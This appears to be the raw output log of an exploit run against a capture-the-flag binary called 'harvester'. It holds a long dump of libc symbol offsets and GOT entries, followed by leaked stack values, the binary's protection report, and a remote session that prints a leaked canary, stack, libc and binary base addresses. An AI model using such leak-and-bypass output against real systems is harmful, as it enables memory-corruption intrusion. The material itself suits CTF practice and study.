[*] '/home/coyote/htb/ca/pwn/harvester/harvester'
    Arch:     amd64-64-little
0x89b5a : sigpending
0x88c2a : bsearch
0x9159a : __assert_perror_fail
0x3695a : strncasecmp_l
-0x23176 : freeaddrinfo
-0x476b6 : __vasprintf_chk
-0x35766 : get_nprocs
0x4ef3a : setvbuf
-0x4b346 : getprotobyname_r
0x3131a : __xpg_strerror_r
0x1355a : __wcsxfrm_l
-0x57e26 : __resolv_context_get_preinit
0x4ea2a : vsscanf
0x3862a : __libc_scratch_buffer_set_array_size
-0x3c26 : fgetpwent
-0x47f76 : gethostbyaddr_r
-0x50046 : setaliasent
-0x5d816 : xdr_rejected_reply
-0x38b06 : capget
0x89b2a : __sigsuspend
-0xf06 : readdir64_r
-0x5f3d6 : getpublickey
-0x1f336 : __sched_setscheduler
-0x673f6 : __rpc_thread_svc_pollfd
-0x67766 : svc_unregister
-0x2ccb6 : fts_open
-0x67d6 : setsid
-0x29726 : fcntl64
-0x6f756 : pututline
-0x3e686 : sgetsgent
0xc5c02 : __resp
-0x6f596 : getutent
-0x27a56 : posix_spawnattr_getsigdefault
-0x3c246 : iswgraph_l
0x1445a : wcscoll
0x6faea : register_printf_type
0x6f9da : printf_size
0x4085a : pthread_attr_destroy
0x1c25a : __wcstoul_internal
0x8615a : nrand48_r
0x85c3a : strfromf32x
-0x6a416 : xdr_uint64_t
-0x632e6 : svcunix_create
0x89cba : __sigaction
-0x3d916 : _nss_files_parse_spent
-0x2e576 : cfsetspeed
-0x46ed6 : __wcpncpy_chk
-0xa9276 : __libc_freeres
-0x29726 : fcntl
0x1d6da : wcsspn
-0x2eb06 : getrlimit64
-0x3bd76 : wctype
-0x52e86 : inet6_option_init
-0x3c676 : __iswctype_l
-0x65e26 : __libc_clntudp_bufcreate
-0x332e6 : ecvt
-0x46c56 : __wmemmove_chk
-0x45eb6 : __sprintf_chk
-0x5bcb6 : bindresvport
-0x4e106 : rresvport
0x6ecca : __asprintf
-0x2e4d6 : cfsetospeed
0x4990a : fwide
0x369aa : __strcasecmp_l
-0x2906 : getgrgid_r
0x4113a : pthread_cond_init
-0x6796 : setpgrp
-0x2e4b6 : cfgetispeed
0x1d8ba : wcsdup
-0x39866 : __socket
0x88c3a : atoll
0x8a0aa : bsd_signal
0x8521a : __strtol_l
-0x71346 : ptsname_r
-0x5ef96 : xdrrec_create
-0x47d46 : __h_errno_location
-0x35f06 : fsetxattr
-0x53c76 : __inet6_scopeid_pton
0x45bca : _IO_file_seekoff
0x6dbfa : _IO_ftrylockfile
0x8910a : __sigtimedwait
-0x29aa6 : __close
0x41baa : _IO_iter_next
-0x31356 : getmntent_r
0x86e3a : labs
-0x2ae26 : link
-0xf86e6 : obstack_exit_failure
0x2a4a : __strftime_l
-0x603c6 : xdr_cryptkeyres
-0x4fac6 : innetgr
-0x29116 : openat
-0xf9996 : _IO_list_all
-0x315c6 : futimesat
0x4c3aa : _IO_wdefault_xsgetn
-0x3c0c6 : __iswcntrl_l
-0x468d6 : __pread64_chk
0x4837a : vdprintf
0x4d2ba : vswprintf
0x5025a : _IO_getline_info
-0x66126 : clntudp_create
-0x1256 : scandirat64
-0x4b186 : getprotobyname
-0x34ae6 : __twalk
0x4fea : strptime_l
0x3545a : argz_create_sep
0x9119a : tolower_l
0x4772a : __fsetlocking
-0xf8af6 : __ctype32_b
-0x45276 : __backtrace
-0x28786 : __xstat
0x1432a : wcscoll_l
-0x330e6 : __madvise
-0x2eb06 : getrlimit
0x8998a : sigsetmask
0x6ea5a : scanf
0x914ba : isdigit
-0x35f36 : getxattr
-0x28e66 : lchmod
-0x66686 : key_encryptsession
0x914da : iscntrl
-0x39ee6 : __libc_msgrcv
-0x38dd6 : mount
-0x2f966 : getdtablesize
-0xcd03a : sys_nerr
0x8651a : random_r
0x9118a : __toupper_l
-0x3ba66 : iswpunct
-0x34fd6 : errx
0x369aa : strcasecmp_l
0x1d4fa : wmemchr
0x36d6a : memmove
-0x66a16 : key_setnet
0x455ca : _IO_file_write
-0x54e6 : uname
-0xfe0d6 : svc_max_pollfd
-0x67e36 : svc_getreqset
0x1c21a : wcstod
-0xfad96 : _nl_msg_cat_cntr
-0x46436 : __chk_fail
-0x3b526 : mcount
-0x74626 : posix_spawnp
0x6da5a : __isoc99_vscanf
0x396fa : mprobe
0x441aa : _IO_file_overflow
0x1c1ba : wcstof
-0x45366 : backtrace_symbols
-0x47516 : __wcsrtombs_chk
-0x39146 : tgkill
0x41aca : _IO_list_resetlock
-0x3a9d6 : _mcleanup
-0x3c6c6 : __wctrans_l
0x911ba : isxdigit_l
0x5070a : _IO_fwrite
0x8910a : sigtimedwait
0x408da : pthread_self
0x1d68a : wcstok
-0x4eb46 : ruserpass
-0x67686 : svc_register
-0x5576 : __waitpid
0x1c27a : wcstol
-0x388f6 : pkey_set
-0x4c416 : endservent
0x50f8a : fopen64
0x4128a : pthread_attr_setschedpolicy
0x4d2aa : vswscanf
-0x74d06 : __nss_group_lookup
0x74eaa : ctermid
-0x27546 : pread
0x1c2aa : wcschrnul
-0x71c76 : __libc_dlsym
-0x30dd6 : __endmntent
0x1c27a : wcstoq
-0x275f6 : pwrite
0x8967a : sigstack
-0x303e6 : mkostemp
-0x5a36 : __vfork
0x477fa : __freadable
0x367ea : strsep
-0x3c046 : iswblank_l
-0x30426 : mkostemps
0x444ea : _IO_file_underflow
0x38b4a : _obstack_begin
-0x4ff86 : getnetgrent
-0x66b56 : user2netname
-0xf980e : __morecore
0x90c4a : bindtextdomain
0x1cb9a : wcsrtombs
0x85fba : getrandom
-0x74d26 : __nss_next
0x1929a : wcstof64_l
-0x293e6 : access
-0x2d0e6 : fts64_read
0x7abea : fmtmsg
-0x1f366 : __sched_getscheduler
-0x33786 : qfcvt
0x3971a : mcheck_pedantic
0x38daa : mtrace
-0x8c6 : ntp_gettime
0x48d4a : _IO_getc
-0x29bf6 : pipe2
0x358fa : memmem
-0x28c56 : __fxstatat
0x4787a : __fbufsize
-0xfce2e : loc1
0x41e8a : _IO_marker_delta
0x356ba : rawmemchr
-0xfce26 : loc2
-0x2ff06 : sync
0x36dda : bcmp
-0x1cc6 : getgrouplist
-0x38ef6 : sysinfo
0x8978a : sigvec
0x4e6ba : getwc_unlocked
-0xf8736 : opterr
-0x67ec6 : svc_getreq
0x3563a : argz_append
-0x65e6 : setgid
-0x729e6 : malloc_set_state
-0x55c06 : __inet_pton_length
-0x2f386 : preadv64v2
-0x45c96 : __strcat_chk
0x4d6aa : wprintf
0x3555a : __argz_count
-0x3e346 : ulckpwdf
-0x2d666 : fts_children
0x36e2a : strxfrm
-0x4be56 : getservbyport_r
-0x286e6 : mkfifo
-0x29116 : openat64
-0x1f366 : sched_getscheduler
-0x29566 : faccessat
0x8758a : on_exit
-0xfe34e : __key_decryptsession_pk_LOCAL
-0x57a36 : __res_randomid
0x486ba : setbuf
0x466aa : fwrite_unlocked
0x37fea : strcmp
0x77f3a : strtof128
0x500aa : _IO_gets
0x8a26a : __libc_longjmp
-0x39546 : recvmsg
0x8575a : __strtoull_internal
-0x3c3c6 : iswspace_l
0x9126a : islower_l
0x4352a : __underflow
-0x275f6 : pwrite64
0x37d4a : strerror
-0x6a2f6 : xdr_wrapstring
-0x475f6 : __asprintf_chk
0x7b17a : __strfmon_l
-0x2e896 : tcgetpgrp
0x7fcaa : strtof64_l
0x9efea : __libc_start_main
0x4e6ba : fgetwc_unlocked
-0xde6 : dirfd
-0x3f356 : _nss_files_parse_sgent
-0x2bf66 : nftw
-0x5d976 : xdr_des_block
-0x60366 : xdr_cryptkeyarg2
-0x5d9e6 : xdr_callhdr
-0x44e6 : setpwent
-0x3c2c6 : iswprint_l
0x7d5aa : strtof64x_l
-0x3a006 : semop
-0x30976 : endfsent
0x911da : __isupper_l
-0xfe756 : _dl_open_hook2
0x4d5da : wscanf
0x493ca : ferror
-0x6f6a6 : getutent_r
-0x63da6 : authdes_create
0x36b0a : stpcpy
-0x2d846 : ppoll
0x3392a : __strxfrm_l
0x4116a : pthread_cond_destroy
0x8ad3a : ldexp
-0x5246 : fgetpwent_r
-0x74656 : fdetach
-0x5566 : __wait
-0x33316 : gcvt
0x4d83a : fwprintf
-0x69f46 : xdr_bytes
0x87ada : setenv
-0x2ef06 : setpriority
-0x71bf6 : __libc_dlopen_mode
-0x277e6 : posix_spawn_file_actions_addopen
0x9262a : nl_langinfo_l
0x42d3a : _IO_default_doallocate
0x9e38a : __gconv_get_modules_db
-0x46906 : __recvfrom_chk
0x50b6a : _IO_fread
-0x1506 : fgetgrent
-0x2fc16 : setdomainname
-0x29316 : write
-0x4bc86 : getservbyport
-0x517f6 : if_freenameindex
0x7fcaa : strtod_l
-0x4a0b6 : getnetent
0x1d87a : wcslen
-0x6fa66 : getutline_r
-0x2db66 : posix_fallocate
-0x29bc6 : __pipe
0x47dda : fseeko
-0x5f376 : xdrrec_endofrecord
-0x3e056 : lckpwdf
-0x3c746 : towctrans_l
-0x53956 : inet6_opt_set_val
0x74c7a : vfprintf
0x37f8a : strcoll
0x8a0aa : ssignal
0x8696a : random
-0x9e66 : globfree
-0x38bc6 : delete_module
-0xf6ed6 : _sys_siglist
0x348da : basename
-0x43866 : argp_state_help
0x1c1fa : __wcstold_internal
-0x47a56 : ntohl
-0x32c96 : closelog
-0x1f296 : getopt_long_only
-0x6776 : getpgrp
0x912ea : isascii
-0x35a86 : get_nprocs_conf
0x1d7ea : wcsncmp
-0x1d396 : re_exec
-0x64b16 : clnt_pcreateerror
-0x2e476 : __write_nocancel
-0x3a7a6 : monstartup
-0x71396 : __ptsname_r_chk
-0x29726 : __fcntl
-0x47a66 : ntohs
-0x38946 : pkey_get
0x6ee4a : snprintf
0x4359a : __overflow
0x10f2a : __isoc99_fwscanf
-0x2d936 : posix_fadvise64
-0x60326 : xdr_cryptkeyarg
0x8575a : __strtoul_internal
0x1d43a : wmemmove
-0x7356 : sysconf
-0x46286 : __gets_chk
0x3882a : _obstack_free
-0x4f496 : setnetgrent
-0x37f86 : gnu_dev_makedev
-0x69ad6 : xdr_u_hyper
-0x28bf6 : __xmknodat
0x1b91a : wcstoull_l
0x5176a : _IO_fdopen
-0x53026 : inet6_option_find
0x9124a : isgraph_l
-0x4c276 : getservent
-0x651a6 : clnttcp_create
-0x47456 : __ttyname_r_chk
-0xfce1e : locs
0x86c0a : wctomb
0x3877a : reallocarray
0x4653a : fputs_unlocked
-0xf8f56 : __memalign_hook
0x8933a : siggetmask
0x4da1a : putwchar_unlocked
-0x3a016 : semget
-0x3f16 : putpwent
0x415ca : _IO_str_init_readonly
-0x5d886 : xdr_accepted_reply
0x8677a : initstate_r
0x4ea2a : __vsscanf
0x1d5ca : wcsstr
0x3b4ea : free
0x45e9a : _IO_file_seek
0x3857a : __libc_dynarray_at_failure
0x9143a : ispunct
-0xfc57e : __daylight
-0x45956 : __cyg_profile_func_exit
0x1d71a : wcsrchr
0x407ca : pthread_attr_getinheritsched
-0x46946 : __readlinkat_chk
-0x5b386 : __nss_hosts_lookup2
-0x66716 : key_decryptsession
-0x34d56 : vwarn
-0x2cfe6 : fts64_close
0x1d3ca : wcpcpy
0xa0bca : plt.realloc
0xa0b7a : __tls_get_addr
0xa0b7a : plt.__tls_get_addr
0xa0b3a : plt.memalign
0xa0b2a : _dl_exception_create
0xa0b2a : plt._dl_exception_create
0xa0aea : __tunable_get_val
0xa0aea : plt.__tunable_get_val
0xa0a2a : _dl_find_dso_for_object
0xa0a2a : plt._dl_find_dso_for_object
0xa09ea : plt.calloc
0xa090a : __libpthread_freeres
0xa090a : plt.__libpthread_freeres
0xa0902 : plt.malloc
0xa08fa : __libdl_freeres
0xa08fa : plt.__libdl_freeres
0xa08f2 : plt.free
-0xf59de : got._res
-0xf81a6 : got.stderr
-0xf81ae : got.error_one_per_line
-0xf81b6 : got.__morecore
-0xf81c6 : got.__key_encryptsession_pk_LOCAL
-0xf81ce : got.__libpthread_freeres
-0xf81d6 : got.__progname_full
-0xf81de : got.__ctype32_tolower
-0xf81e6 : _rtld_global
-0xf81e6 : got._rtld_global
-0xf81ee : got.__progname
-0xf81f6 : got.argp_err_exit_status
-0xf8206 : got.mallwatch
-0xf820e : got.__rcmd_errstr
-0xf8216 : __libc_enable_secure
-0xf8216 : got.__libc_enable_secure
-0xf821e : got._res_hconf
-0xf8226 : got.malloc
-0xf822e : got.getdate_err
-0xf8236 : got.svcauthdes_stats
-0xf823e : got.__tzname
-0xf8246 : got.__timezone
-0xf8256 : _rtld_global_ro
-0xf8256 : got._rtld_global_ro
-0xf825e : got.__malloc_initialize_hook
-0xf826e : got.optarg
-0xf8276 : got.__ctype_tolower
-0xf827e : got.__ctype_toupper
-0xf9b76 : got._IO_2_1_stderr_
-0xf828e : got.__ctype_b
-0xf8296 : got.argp_program_version_hook
-0xf829e : got.__after_morecore_hook
-0xf82a6 : got.__environ
-0xf9b7e : got._IO_2_1_stdout_
-0xf82b6 : got.__ctype32_b
-0xf82be : got.__curbrk
-0xf82c6 : got.argp_program_version
-0xf82ce : got.__daylight
-0xf82d6 : got.__memalign_hook
-0xf82e6 : got.__malloc_hook
-0xf82ee : got.__free_hook
-0xf82f6 : got._nl_domain_bindings
-0xf82fe : got._nl_msg_cat_cntr
-0xf8306 : got.argp_program_bug_address
-0xf830e : got.__key_decryptsession_pk_LOCAL
-0xf8316 : got.h_errlist
-0xf8326 : got.program_invocation_short_name
-0xf832e : got.optind
-0xf8336 : _dl_starting_up
-0xf8336 : got._dl_starting_up
-0xf833e : got.stdout
-0xf8346 : got.obstack_alloc_failed_handler
-0xf834e : got.error_print_progname
-0xf8356 : got.optopt
-0xf835e : got._IO_funlockfile
-0xf8366 : got.obstack_exit_failure
-0xf836e : got.loc1
-0xf8376 : got.error_message_count
-0xf837e : got.__libdl_freeres
-0xf9b86 : got._IO_2_1_stdin_
-0xf838e : got.loc2
-0xf8396 : got.program_invocation_name
-0xf839e : got.free
-0xf83a6 : got.__fpu_control
-0xf83ae : got.re_syntax_options
-0xf83b6 : got.stdin
-0xf83be : got.__check_rhosts_file
-0xf83c6 : got.opterr
-0xf83ce : got.__ctype32_toupper
-0xf83d6 : got.__realloc_hook
-0xf83de : _dl_argv
-0xf83de : got._dl_argv
-0xf8426 : got.realloc
-0xf844e : got.__tls_get_addr
-0xf846e : got.memalign
-0xf8476 : got._dl_exception_create
-0xf8496 : got.__tunable_get_val
-0xf84f6 : got._dl_find_dso_for_object
-0xf8516 : got.calloc
[*] Binary base @ 0x557afda08000
1: 0x0      -0x7f48edd08000
2: 0x0      -0x7f48edd08000
3: 0x7f48eddcdc0a      0xc5c0a
4: 0x20      -0x7f48edd07fe0
5: 0x7      -0x7f48edd07ff9
6: 0xa70243625      -0x7f3e7dac49db
7: 0x0      -0x7f48edd08000
8: 0x0      -0x7f48edd08000
9: 0x0      -0x7f48edd08000
10: 0x7ffd053d6cd0      0xb4176cecd0
11: 0x9adaddb05b4200      0x9a5b94c28ac200
[*] '/home/coyote/htb/ca/pwn/harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[x] Opening connection to 188.166.172.13 on port 32049
[x] Opening connection to 188.166.172.13 on port 32049: Trying 188.166.172.13
[+] Opening connection to 188.166.172.13 on port 32049: Done
[*] canary = 0x1ee510a016207c00
[*] Stack address 0x7ffcd1517e60
[*] Libc base @ 0x7f00dd451000
[*] Binary base @ 0x555d7c1ab000
[*] Inventory: dropped -11 pies
